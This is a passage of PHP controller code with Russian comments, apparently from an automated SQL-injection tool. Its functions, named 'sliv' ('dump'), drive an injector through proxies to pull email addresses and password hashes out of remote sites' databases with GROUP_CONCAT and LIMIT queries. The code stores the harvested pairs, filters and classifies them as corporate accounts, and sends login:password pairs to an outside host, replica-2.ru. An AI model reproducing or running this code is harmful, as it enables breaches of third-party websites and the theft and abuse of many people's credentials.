				$data = $this->Post->query("SELECT * FROM  `fileds` WHERE (`password`='' or `password`=':') AND `get` = '3' AND dok < 4 ORDER BY  `fileds`.`count` DESC limit 1");//DESC
				if(count($data)==0)
				{
					$this->stop();
					die();
				}
				
			}		
			
		}
		
		
		
		
		foreach($data as $val)
		{
			
			
			if($val['fileds']['lastlimit'] > $val['fileds']['count']){
				
				$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '4', `dok`= {$dok} WHERE  `fileds`.`id` =".$val['fileds']['id']);
				
			}

			$dok  = $val['fileds']['dok'];
			$dok = $dok +1;
			$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '1', `dok`= {$dok} WHERE  `fileds`.`id` =".$val['fileds']['id']);
			
			$this->Post->query("UPDATE  `starts` SET  `squle_id` = ".$val['fileds']['id']." WHERE  `time_start` =".$this->timeStart);
			
			if($val['fileds']['password']!=='' AND $val['fileds']['password']!==':'){	
				$sliv = $this->slivWithPassConcast($val['fileds']['id']);
				//$this->FindSaltInSqule($val['fileds']['id']);
			}else{
				$sliv = $this->sliv($val['fileds']['id']);
			}
			
			
			if($sliv!=='vpizdu'){			
				
				
				$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '2' WHERE  `fileds`.`id` =".$val['fileds']['id']);
				
			}else
			{
				
				$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '3' WHERE  `fileds`.`id` =".$val['fileds']['id']);
				
			}
		}
		$this->stop();
		die('okay');
	}
	
	function getmailfull(){ // слив всего и пассом и мыл

		
		
		$this->timeStart = $this->start('getmailfull',1);
		
		//получаем настройки
		$settings['potok_one']  = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass']= $this->pass;
		
		echo $settings['pass'].'<br>';
		
		if($settings['pass'] == 1)//если включено парсить ТОЛЬКО пассы
		{
			
			$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password`!=':' AND `get` = ''  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
			
			if(count($data)==0)
			{
				$this->stop();
				die('stop 1');
			}
			
			
		}elseif($settings['pass'] == 2)//только мыла просто
		{
			$data = $this->Post->query("SELECT * FROM  `fileds` WHERE (`password`='' or `password`=':') AND `get` = '' ORDER BY  `fileds`.`count` DESC limit 1");
			
			if(count($data)==0)
			{
				$this->stop();
				die('stop 2');
			}
			
			
		}elseif($settings['pass'] == 3)
		{//или парсим всё
			$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password`!=':' AND `get` = ''  ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
			
			$this->d($data,'pass 3');
			
			if(count($data)==0)
			{
				
				$data = $this->Post->query("SELECT * FROM  `fileds` WHERE (`password`='' or `password`=':') AND `get` = '' ORDER BY  `fileds`.`count` DESC limit 1");
				$this->d($data,'mail 3');
				if(count($data)==0)
				{
					$this->stop();
					die('stop 3');
				}
				
			}
		}
		
		
		$this->d($data);
		//$this->stop();
		//exit;
		
		
		
		foreach($data as $val)
		{

			$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '1' WHERE  `fileds`.`id` =".$val['fileds']['id']);
			
			$this->Post->query("UPDATE  `starts` SET  `squle_id` = ".$val['fileds']['id']." WHERE  `time_start` =".$this->timeStart);
			
			
			if($val['fileds']['password']!=='' AND $val['fileds']['password']!==':'){	
				$sliv = $this->slivWithPassConcast($val['fileds']['id']);
				//$this->FindSaltInSqule($val['fileds']['id']);
			}else{
				$sliv = $this->sliv($val['fileds']['id']);
			}
			
			
			if($sliv!=='vpizdu'){			
				
				$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '2' WHERE  `fileds`.`id` =".$val['fileds']['id']);
				
			}else{
				
				$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '3' WHERE  `fileds`.`id` =".$val['fileds']['id']);
				
			}
		}
		$this->stop();
		die('okay');
	}
	
	function sliv($id=0){//слив емайлов без паролей через group concat
		

		
		$mail = $this->Filed->findbyid($id);
		
		$squle = $this->Post->query("SELECT * FROM  `posts` WHERE id = ".$mail['Filed']['post_id']." limit 0,1");
		
		
		
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			$this->d($set,'SET emailS');
		}else
		{
			$set = false;
		}
		
		
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		
		
		$bd = explode(':', $mail['Filed']['ipbase']);
		
		$count = $mail['Filed']['count'];

		$shag = 15;
		
		$zapr  = round($count/$shag);
		
		if($zapr==0)$zapr=1;

		$start = 0;

		
		$url = parse_url($squle[0]['posts']['url']);				
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone)-1];

		$filename = "./sliv/".$zone.'_'.$url['host'].".txt";
		
		
		
		
		//$fh = fopen($filename, "a+");
		
		$ff = intval($mail['Filed']['lastlimit']);
		
		$this->d($ff,'lastlimit');
		if($ff!==0){
			
			$start = $ff;
			$ff = $ff/40;
			
		}else{
			$ff = 0;
		}
		
		//echo $ff.'|'.$zapr.'<br/>';
		$d=0;
		
		$time = time();
		
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		
		
		for ($i=$ff;$i<$zapr;$i++)
		{
			
			$this->workup();
			$new = time();
			$razn = $new-$time;
			
			
			
			
			if($razn>20)return 'vpizdu';
			
			$time = time();
			
			
			
			$d++;
			$this->Post->query("UPDATE  `fileds` SET  `lastlimit` = $start WHERE  `id`=".intval($id)." ");

			
			$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT '.$mail['Filed']['label'].' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').') LIMIT '.$start.','.$shag.')t ', 'GROUP_CONCAT(t.'.$mail['Filed']['label'].')',0,array());
			
			
			$this->d($mysql);
			
			$start = $start + $shag;
			
			

			if($i==0 AND !isset($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].')']))
			{
				
				fclose($fh);
				$this->Post->query("UPDATE  `fileds` SET  `function` = 1 WHERE  `id` =$id ");
				if($this->slivone($id)=='vpizdu')return 'vpizdu';
				break;
				return ;
			}
			
			
			
			if($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].')']!=='')
			{
				$mails = explode(',', $mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].')']);
				
				$tmp = array();
				$tmp3 = array();
				foreach ($mails as $value)
				{
					if(trim($value)!=='')fwrite($fh, trim($value)."\n");
					preg_match('/\\A(?:^([a-z0-9][a-z0-9_\\-\\.\\+]*)@([a-z0-9][a-z0-9\\.\\-]{0,63}\\.([a-z]{2,4}))$)\\z/i',$value,$z);
					
					if($z[0] !='')//если строка мыло нормальное
					{	
						
						@$key = array_search($z[0], $tmp);
						@$key2 = array_search(strlen($z[0]), array_slice($this->tmp2, count($this->tmp2)-1));
						
						$this->tmp2[] = strlen($z[0]);
						$tmp[] = $z[0];
						
						//$this->d($key2,'key2');
						
						
						if($key === FALSE)
						{			
							echo $value."<br>";
							
							$m = explode('@',$z[0]);
							
							if($key2 !== FALSE )
							{
								$this->l2++;
								$this->d($this->l2,'l2');
								
								
								if($this->l2 > 40)
								{
									$this->d($this->l2,'vpizdu');
									return "vpizdu";
								}
								
							}else{
								$this->l2--;
							}
							
							
							//$fieldcount = $this->Post->query("SELECT id FROM  `mails` WHERE  email ='".$z[0]."' AND domen = '".$url['host']."'");

							//$this->d($fieldcount);	
							echo '-------<br>';				
							//if(count($fieldcount) == 0 )
							//{
							
							
							$this->Post->query("INSERT INTO mails (email,pass,date,domen,hashtype,bd,zona,meiler) VALUES('{$z[0]}','0',now(),'{$url[host]}','0','{$bd[1]}','{$zone}','{$m[1]}')");
							
							
							//}else{
							//	echo ' - uje est<br>';
							//}
							
							
						}
					}
				}
			}			
		}
		fclose($fh);
		
		//$this->d(mails);
		//exit();
		
		$this->renamename($filename);
		
		
	}
	
	function slivone($id){//слив через одиночный лимит
		
		$hunta= 1;
		$mail =  $this->Filed->findbyid($id);
		$squle = $this->Post->query("SELECT * FROM `posts` WHERE id = ".$mail['Filed']['post_id']." limit 0,1");

		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
		}else
		{
			$set = false;
		}
		
		$this->d($set,'SET email odin');
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		
		$bd = explode(':', $mail['Filed']['ipbase']);
		
		$count = $mail['Filed']['count'];
		
		$start = 0;

		$url = parse_url($squle['Post']['url']);
		
		$zone = explode('.', $url['host']);

		$zone = $zone[count($zone)-1];
		
		
		$filename = "sliv/".$zone.'_'.$url['host'].".txt";
		
		
		$fh = fopen($filename, "a+");
		
		
		$ff = intval($mail['Filed']['lastlimit']);
		
		$time = time();
		
		$tmp = array();
		$tmp3 = array();
		
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		
		
		for ($i=$ff;$i<$count;$i++)
		{
			
			$this->workup();
			
			$new = time();
			$razn = $new-$time;
			if($razn>30)return 'vpizdu';

			$this->Post->query("UPDATE  `fileds` SET  `lastlimit` = $i WHERE  `id`=".intval($id)." ");
			
			$mysql = $this->mysqlInj->mysqlGetValue($bd[1],$mail['Filed']['table'], $mail['Filed']['label'], $i,array(),' WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').')');
			
			
			if(trim($mysql[$mail['Filed']['label']])!=='')
			{
				fwrite($fh, trim($mysql[$mail['Filed']['label']])."\n");
				preg_match('/\\A(?:^([a-z0-9][a-z0-9_\\-\\.\\+]*)@([a-z0-9][a-z0-9\\.\\-]{0,63}\\.([a-z]{2,4}))$)\\z/i',$value,$z);
				
				if($z[0] !='')//если строка мыло нормальное
				{	
					
					@$key = array_search($z[0], $tmp);
					$tmp[] = $z[0];
					
					@$key2 = array_search(strlen($z[0]), array_slice($this->tmp2, count($this->tmp2)-1));
					
					
					
					if($key === FALSE)
					{	
						echo $z[0]."<br>";
						$m = explode('@',$z[0]);
						
						
						if($key2 !== FALSE )
						{
							$this->l2++;
							$this->d($this->l2,'l2');
							if($this->l2 > 25)
							{
								return 'vpizdu';
							}
							
						}else{
							$this->l2--;
						}
						
						
						//$fieldcount = $this->Post->query("SELECT id FROM  `mails` WHERE  email ='".$z[0]."' AND domen = '".$url['host']."'");

						echo '-------<br>';	
						
						//if(count($fieldcount) == 0 )
						//{
						
						$this->Post->query("INSERT INTO mails (email,pass,date,domen,hashtype,bd,zona,meiler) VALUES('{$z[0]}','0',now(),'{$url[host]}','0','{$bd[1]}','{$zone}','{$m[1]}')");
						
						
						$hunta=0;	
						
						//}else{
						//echo ' uje est<br>';
						
						//}
					}
				}	
			}else
			{
				
				
				$hunta = $hunta+1;
			}


			if($hunta==20){
				break;
				return ;
			}
		}
		
		
		fclose($fh);
		
	}
	
	function slivWithPassConcast($id=9){ //слив паролей через group concat
		
		
		$mail = $this->Filed->findbyid($id);

		$squle = $this->Post->query("SELECT * FROM  `posts` WHERE id = ".$mail['Filed']['post_id']." limit 0,1");


		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			$this->d($set,'pass SET dump');
		}else
		{
			$set = false;
		}
		
		//инициируем первоначальные параметры
		$this->mysqlInj = new $this->Injector();
		
		$this->proxyCheck();
		
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		
		
		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];

		$shag = 20;
		
		$zapr  = round($count/$shag);
		if($zapr==0)$zapr=1;
		

		$start = 0;
		
		$url = parse_url($squle[0]['posts']['url']);				

		$zone = explode('.', $url['host']);

		$zone = $zone[count($zone)-1];

		$filename = "./sliv/".$zone.'_'.$url['host'].".txt";
		
		
		$ff = intval($mail['Filed']['lastlimit']);
		
		if($ff!==0)
		{
			
			$start = $ff;
			$ff = $ff/20;
			
		}else{
			$ff = 0;
		}
		
		$fh = fopen($filename, "a+");
		
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		
		
		$this->l5 = 0;
		$this->tmp5 = array();
		
		for ($i=$ff;$i<$zapr;$i++)
		{
			
			
			
			$this->workup();
			$pass=explode(':', $mail['Filed']['password']);
			$pass = $pass[1];
			
			$this->Post->query("UPDATE  `fileds` SET  `lastlimit` = $start WHERE  `id`=".intval($id)." ");
			
			
			$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT+'.$mail['Filed']['label'].','.$pass.' FROM '.$bd[1].'.`'.$mail['Filed']['table'].'` WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').') LIMIT '.$start.','.$shag.')t ', 'GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')',0,array());
			
			$start = $start + $shag;
			
			//$this->d($mysql);
			
			if($i==0 AND !isset($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')'])){
				
				fclose($fh);
				$this->Post->query("UPDATE  `fileds` SET  `function` = 1 WHERE  `id` =$id ");
				
				$this->slivWithPass($id);
				break;
				return ;
			}
			
			if($mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')']!=='')
			{

				$mails = explode(',', $mysql['GROUP_CONCAT(t.'.$mail['Filed']['label'].',char('.$this->charcher(':').'),t.'.$pass.')']);
				
				$null = 0;	
				$l =0;
				
				
				$tmp = array();
				$tmp3 = array();
				
				foreach ($mails as $value)
				{
					
					echo '||'.$value.'||<br/>';
					fwrite($fh, trim($value)."\n");
					
					$p = explode(':',$value);
					
					if(!isset($p[1]))
					{
						$pass = '';
					}else{
						$pass = trim($p[1]);
						
					}
					
					@$key0 = array_search($pass, $this->stopword);
					
					
					
					
					if($key0 === FALSE AND strlen($pass) > 2)
					{

						$ht = $this->hashtype($pass);
						
						if($ht != 1)
						{
							$this->hashtype = $ht;
						}else{
							$this->hashtype = '0';
						}
						
						
						
						
						preg_match('/\\A(?:^([a-z0-9][a-z0-9_\\-\\.\\+]*)@([a-z0-9][a-z0-9\\.\\-]{0,63}\\.([a-z]{2,4}))$)\\z/i',$p[0],$z);
						
						if($z[0] !='')//если строка мыло нормальное
						{
							
							$m = explode('@',$z[0]);
							
							@$key = array_search($pass, $tmp);
							//смотрит последний элемент массива не такой же он, чтобы найти короткие хеши 
							@$key2 = array_search(strlen($pass), array_slice($this->tmp2, count($this->tmp2)-1));
							
							//сравниваем мыла
							@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5)-1));
							
							
							//чтобы не было дубликатов
							@$key3 = array_search($p[0], $tmp3);
							
							
							$this->d(array_slice($this->tmp2, count($this->tmp2)-1),'slice');
							$this->d(strlen($pass),'strlen');
							
							
							$tmp[]  = $pass;
							$tmp3[] = $p[0];
							
							$this->tmp2[] = strlen($pass);
							
							$this->tmp5[] = strlen($z[0]);
							

							$this->d($key2,'key');
							
							
							if($this->hashtype == '0')
							{
								//$this->d($this->hashtype,'hash');
								
								
								//проверяем какой нить маленьких хэш по количеству символов
								if($key2 !== FALSE AND $this->k < 6)
								{
									$this->l2++;
									//$this->d($this->l2,'буква L2');
									
									
									if($this->l2 > 7)
									{
										$this->hashtype = 'unkown';
									}
									
								}else{
									$this->k++;
									
								}

							}
							
							//проверка чтобы мыла не были одной длины слишком часто
							if($key5 !== FALSE )
							{
								$this->l5++;
								$this->d($this->l5,'l5');
								if($this->l5 > 45)
								{
									return 'vpizdu';
								}
								
							}else{
								$this->l5--;
							}
							
							
							if($key === FALSE AND $key3 === FALSE)
							{
								
								//$fieldcount = $this->Post->query("SELECT id FROM  `mails` WHERE  email ='".$p[0]."' AND domen = '".$url['host']."'");

								echo '-------<br>';	
								
								//if(count($fieldcount) == 0 )
								//{
								
								$this->Post->query("INSERT INTO mails (email,pass,date,domen,hashtype,bd,zona,meiler) VALUES('{$p[0]}','{$pass}',now(),'{$url[host]}','{$this->hashtype}','{$bd[1]}','{$zone}','{$m[1]}')");
								
								echo 'OK<br>';
								//}else{
								
								//echo ' - uje est<br>';
								//}
								
								fwrite($fh, trim($value)."\n");
							}else
							{
								$l++;
								
								if($l == 20)return;
								
								echo $key.'<br>';
							}
						}
					}else
					{
						$null++;	
						if($null == 10)
						{
							echo 'Много пустных или null';
							return;
						}
					}	
					flush();
				}
			}				
		}
		fclose($fh);
		$this->renamename($filename);
		
		return ;
		
	}

	function slivWithPass($id=9){//слив паролей через одиночный лимит
		

		$hunta = 1;
		
		$mail = $this->Filed->findbyid($id);
		$squle = $this->Post->query("SELECT * FROM  `posts` WHERE id = ".$mail['Filed']['post_id']." limit 0,1");
		
		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
		}else
		{
			$set = false;
		}
		
		$this->d($set,'pass SET dump odin');
		
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		

		$bd = explode(':', $mail['Filed']['ipbase']);

		$count = $mail['Filed']['count'];
		
		$start = 0;
		

		$url = parse_url($squle[0]['posts']['url']);				

		$zone = explode('.', $url['host']);

		$zone = $zone[count($zone)-1];

		$filename = "./sliv/".$zone.'_'.$url['host'].".txt";
		

		$fh = fopen($filename, "a+");
		

		$pass = explode(':', $mail['Filed']['password']);
		$pass = $pass[1];
		
		$ff = intval($mail['Filed']['lastlimit']);
		$null = 0;
		$l=0;
		$tmp = array();
		$tmp3 = array();
		
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		
		
		$this->l5 = 0;
		$this->tmp5 = array();
		for ($i=$ff;$i<$count;$i++)
		{

			$this->workup();

			$this->Post->query("UPDATE  `fileds` SET  `lastlimit` = $i WHERE  `id`=".intval($id)." ");
			
			
			$mysql = $this->mysqlInj->mysqlGetValue($bd[1],$mail['Filed']['table'], array($mail['Filed']['label'],$pass), $i,array(),' WHERE `'.$mail['Filed']['label'].'` LIKE char('.$this->charcher('%@%').')');
			
			$this->d($mysql);
			
			
			if(trim($mysql[$mail['Filed']['label']])!=='')
			{
				
				echo  $mysql[$mail['Filed']['label']].':'.$mysql[$pass]."||<br/>";
				fwrite($fh, $mysql[$mail['Filed']['label']].':'.$mysql[$pass]."\n");
				
				$ht = $this->hashtype($mysql[$pass]);
				if($ht != 1)
				{
					$this->hashtype = $ht;
				}else{
					$this->hashtype = '0';
				}
				
				
				@$key0 = array_search($pass, $this->stopword);
				
				
				
				
				if($key0 === FALSE AND strlen($pass) > 2)
				{

					$pass2 = $mysql[$pass];
					
					preg_match('/\\A(?:^([a-z0-9][a-z0-9_\\-\\.\\+]*)@([a-z0-9][a-z0-9\\.\\-]{0,63}\\.([a-z]{2,4}))$)\\z/i',$mysql[$mail['Filed']['label']],$z);
					
					if($z[0] !='')//если строка мыло нормальное
					{
						
						$m = explode('@',$z[0]);
						
						@$key = array_search($pass2, $tmp);
						@$key2 = array_search(strlen($pass2), array_slice($this->tmp2, count($this->tmp2)-1));
						@$key3 = array_search($mysql[$mail['Filed']['label']], $tmp3);
						
						//сравниваем мыла
						@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5)-1));
						$this->tmp5[] = strlen($z[0]);
						
						
						$this->tmp2[] = strlen($pass2);
						$tmp[]  = $pass2;
						$tmp3[] = $mysql[$mail['Filed']['label']];
						
						
						$this->d(array_slice($this->tmp2, count($this->tmp2)-1),'slice');
						$this->d(strlen($pass2),'strlen');
						
						if($this->hashtype == '0')
						{
							$this->d($this->hashtype,'hash');
							
							
							//проверяем какой нить маленьких хэш по количеству символов
							if($key2 !== FALSE AND $this->k < 6)
							{
								$this->l2++;
								//$this->d($this->l2,'буква L2');
								
								//$this->d($this->tmp2,'tmp2');
								if($this->l2 > 7)
								{
									$this->hashtype = 'unkown';
								}
								
							}else{
								$this->k++;
							}
						}
						//если 35 подряд мыл есть одинаковых тогда выходим
						if($key5 !== FALSE)
						{
							$this->l5++;
							$this->d($this->l5,'буква L5');
							
							
							if($this->l5 > 35)
							{
								return 'vpizdu';
							}
							
						}else{
							$this->l5--;
						}
						
						
						if($key === FALSE AND $key3 === FALSE)
						{
							
							//$fieldcount = $this->Post->query("SELECT id FROM  `mails` WHERE  email ='".$mysql[$mail[Filed][label]]."' AND domen = '".$url['host']."'");

							echo '-------<br>';	
							
							//if(count($fieldcount) == 0 )
							//{
							
							
							$this->Post->query("INSERT INTO mails (email,pass,date,domen,hashtype,bd,zona,meiler) VALUES('{$mysql[$mail[Filed][label]]}','{$mysql[$pass]}',now(),'{$url[host]}','{$this->hashtype}','{$bd[1]}','{$zone}','{$m[1]}')");
							
							echo 'OK<br>';
							
							//}else{
							//	echo 'uje -est<br>';
							
							//}
							
							
						}else
						{
							$l++;
							
							if($l == 20)return;
							
							echo $key.'<br>';
						}
					}
				}	
				else
				{
					$null++;	
					if($null == 8)
					{
						echo 'Много пустых или null';
						return;
					}
					
				}
				
				
				
				flush();
				
				
				$hunta=0;	
			}else
			{
				$hunta = $hunta+1;
				echo $hunta.'<br>';
			}


			if($hunta==20)
			{
				fclose($fh);
				return ;
			}
			
			
		}
		
		
		
		fclose($fh);
		
		return ;//	die();
	}
	

	
	
	//////////////БЛОК SMTP И ПОЧТЫ///////////////
	
	
	
	function abuse(){
		
		$this->timeStart = $this->start('abuse',1);
		
		$aaa  = file('abuse.txt');
		
		foreach($aaa as $aa)
		{
			$abuse[trim(strtolower($aa))] = trim(strtolower($aa));
		}
		
		
		$file = $this->Post->query("SELECT `id`,`email` FROM `mails` WHERE `abuse`=0 limit 50000");
		
		foreach ($file as $val)
		{
			$ku = 0;
			
			$dom =strtolower(trim($val['mails']['email']));
			
			//$this->d($dom);
			//exit;
			
			if(isset($abuse[$dom]))
			{
				$ku = 2;
			}else{
				$ku = 1;
			}
			
			$this->d($dom.' -- '.$ku);	
			//exit;
			
			
			if($ku ==2)	
			{
				$this->Post->query("UPDATE `mails` SET `abuse`=2 WHERE `id`=".$val['mails']['id']);
			}else{
				$this->Post->query("UPDATE `mails` SET `abuse`=1 WHERE `id`=".$val['mails']['id']);
			}
			
			unset($ku);
			
		}
		
		////////////////
		
		$file2 = $this->Post->query("SELECT `id`,`email` FROM `mails_one` WHERE `abuse`=0 limit 50000");
		
		foreach ($file2 as $val2)
		{
			$ku2 = 0;
			
			$dom2 =strtolower(trim($val2['mails_one']['email']));
			
			//$this->d($dom);
			//exit;
			
			if(isset($abuse[$dom2]))
			{
				$ku2 = 2;
			}else{
				$ku2 = 1;
			}
			
			$this->d($dom2.' -- '.$ku2);	
			//exit;
			
			
			if($ku2 ==2)	
			{
				$this->Post->query("UPDATE `mails` SET `abuse`=2 WHERE `id`=".$val2['mails_one']['id']);
			}else{
				$this->Post->query("UPDATE `mails` SET `abuse`=1 WHERE `id`=".$val2['mails_one']['id']);
			}
			
			unset($ku2);
			
		}
		
		
		$this->Filed->query("DELETE FROM `mails` WHERE `abuse` = 2");
		
		$this->Filed->query("DELETE FROM `mails_one` WHERE `abuse` = 2");
		
		
		$this->stop();
	}

	function typecorp_pass(){
		
		$this->timeStart = $this->start('typecorp_pass',1);
		
		$aaa  = file('bigs.txt');
		
		foreach($aaa as $aa)
		{
			$bigs[trim($aa)] = trim($aa);
		}
		
		
		//$this->d($bigs);
		
		$bbb  = file('sred.txt');
		
		foreach($bbb as $bb)
		{
			$sreds[trim($bb)] = trim($bb);
		}
		
		$file = $this->Post->query("SELECT `id`,`email` FROM `mails` WHERE `type`='0' limit 100000");
		
		
		//$this->d($bigs);
		
		foreach ($file as $val)
		{
			$ku = '';
			
			$em = explode('@',$val['mails']['email']);
			$dom = trim($em[1]);
			$dom =strtolower($dom);
			
			
			
			if(isset($bigs[$dom])){$ku = 'big';}
			
			elseif(isset($sreds[$dom])){$ku = 'sred';}
			
			else{$ku ='corp';}
			
			
			
			//$this->d($bigs[$dom],'$bigs[$dom]');	
			
			$this->d($dom.' -- '.$ku);	
			//exit;
			
			
			if($ku =='big')	
			{
				$this->Post->query("UPDATE `mails` SET `type`='big' WHERE id=".$val['mails']['id']);
			}
			elseif($ku =='sred')	
			{
				$this->Post->query("UPDATE `mails` SET `type`='sred' WHERE id=".$val['mails']['id']);
			}else{
				$this->Post->query("UPDATE `mails` SET `type`='corp' WHERE id=".$val['mails']['id']);
			}
			
			unset($ku);

		}
		
		$this->stop();
	}

	function typecorp_one(){
		
		$this->timeStart = $this->start('typecorp_one',1);
		
		$aaa  = file('bigs.txt');
		
		foreach($aaa as $aa)
		{
			$bigs[trim($aa)] = trim($aa);
		}
		
		
		//$this->d($bigs);
		
		$bbb  = file('sred.txt');
		
		foreach($bbb as $bb)
		{
			$sreds[trim($bb)] = trim($bb);
		}
		
		$file = $this->Post->query("SELECT `id`,`email` FROM `mails_one` WHERE `type`='0' limit 100000");
		
		
		//$this->d($bigs);
		
		foreach ($file as $val)
		{
			$ku = '';
			
			$em = explode('@',$val['mails_one']['email']);
			$dom = trim($em[1]);
			$dom =strtolower($dom);
			
			
			
			if(isset($bigs[$dom])){$ku = 'big';}
			
			elseif(isset($sreds[$dom])){$ku = 'sred';}
			
			else{$ku ='corp';}
			
			
			
			//$this->d($bigs[$dom],'$bigs[$dom]');	
			
			$this->d($dom.' -- '.$ku);	
			//exit;
			
			
			if($ku =='big')	
			{
				$this->Post->query("UPDATE `mails_one` SET `type`='big' WHERE id=".$val['mails_one']['id']);
			}
			elseif($ku =='sred')	
			{
				$this->Post->query("UPDATE `mails_one` SET `type`='sred' WHERE id=".$val['mails_one']['id']);
			}else
			{
				$this->Post->query("UPDATE `mails_one` SET `type`='corp' WHERE id=".$val['mails_one']['id']);
			}
			
			unset($ku);

		}
		
		$this->stop();
	}
	
	function sort_emails(){//выбирает файлы из базы данных в каталог
		
		if($this->debug)
		{
			$this->writelogs('zapusk sort',"DEBUG.txt");
		}
		
		$dbpath = $this->corp;
		
		$dir = opendir ($dbpath); // открываем директорию
		$i = 0; // создаём переменную для цикла


		$lll = 0;

		//$this->d(readdir($dir));
		
		while (false !== ($file = readdir($dir))) 
		{

			//$this->d($dbpath.$file);
			// ниже указываем расширение файла. Вместо jpg выбираете нужный
			if (( $file != ".") && ($file != "..") && ($file != "Thumbs.db")) 
			{
				$file2=file($dbpath.$file); 
				$i++;
				$count = sizeof($file2)-1;
				//$this->d($count);
				$lll = $lll+$count;
			}
			
		}        
		
		$this->d($lll,'lll');
		exit;
		
		if($lll < 5000)
		{
			$this->d('$lll < 5000');
			$file = $this->Post->query("SELECT `id`,`email`,`pass` FROM `mails` WHERE `type`='corp' AND pass !='0' AND hashtype ='0' AND mx='0' limit 1000");

			if(count($file)==0){
				
				//$file = $this->Post->query("SELECT `id`,`email`,`pass` FROM `mails` WHERE `type`='sred' AND pass !='0' AND hashtype ='0' AND mx='0' limit 1000");
				
				foreach ($file as $val)
				{
					$this->d($val);
					$login = $val['mails']['email'];
					$pass = $val['mails']['pass'];
					$explp = explode("@", $login);
					$domain = $explp[1];
					
					$this->d($dbpath.$domain.".txt");
					$write_file = fopen ($dbpath.$domain.".txt","a+");
					fputs ( $write_file, "\n".$login.":".$pass);
					fclose ($write_file);
					
					$this->Post->query("UPDATE  `mails` SET  `mx` = '1' WHERE  `id` =".$val['mails']['id']);
					
				}
			}
		}
		die();
		
	}
	
	function mx_check(){//основная функция распределения потоков
		
		$gc_dbpath='korporate/';
		
		
		
		$endc = $this->count_f($gc_dbpath);
		
		$startc=0;
		
		while($startc<$endc)
		{
			$startc=$startc+1;
			
			$accsdir=$this->show_f($gc_dbpath,$startc);
			
			$file_tmp = file($accsdir); 
			$costr = count($file_tmp);
			
			
			if($costr<1)
			{
				unlink($accsdir);
			}else
			{
				while($costr>0)
				{
					@$reboot_thread_count=$reboot_thread_count+1;
					
					if($reboot_thread_count>400)
					{
						die();
					}
					
					$costr=$costr-1;
					$acce=$this->get_and_explode($accsdir);
					
					$filesize = filesize($accsdir);
					
					if($filesize<8)
					{
						unlink($accsdir); 
					}
					
					if(empty($acce[0]) AND empty($acce[1])){}
					else
					{
						$acc=urlencode($acce[0].':'.$acce[1]);
						$acc = trim($acc);
						$this->d('zapusk '.$acc);
						
						$acc = base64_encode($ku);
						
						$url = 'http://replica-2.ru/posts/mx_check_one/'.$acc;
						file_get_contents($url);
						
						if($this->debug)
						{
							$this->writelogs('file_get_contents=('.$url,"DEBUG.txt");
						}
						
						usleep(300000);
					}
					die();
				}
			}
			usleep(200000);
		}
		
		
	}
	
	function get_and_explode($file_from){//доп функция

		if($this->debug){
			$this->writelogs('get_and_explode(in) $file_from='.$file_from,"DEBUG.txt");
		}
		
		$getlpa=file($file_from);
		
		$loginpass=$getlpa[0];
		
		$id = "1";
		
		if ($id != "") 
		{
			$id--;
			$file=file($file_from); 
			for($i=0;$i<sizeof($file);$i++)
			if($i==$id) unset($file[$i]); 
			$fp=fopen($file_from,"w"); 
			fputs($fp,implode("",$file)); 
			fclose($fp);
		}
		//////////////
		// на выходе получаем первую строку + очистку файла от первой строки переменка   $loginpass 
		//////////////Конец
		//////////////
		//расчленяем логин пасс
		//////////////
		$loginpass = str_replace('
		', '', $loginpass);
		$loginpass = str_replace("\n", '', $loginpass);
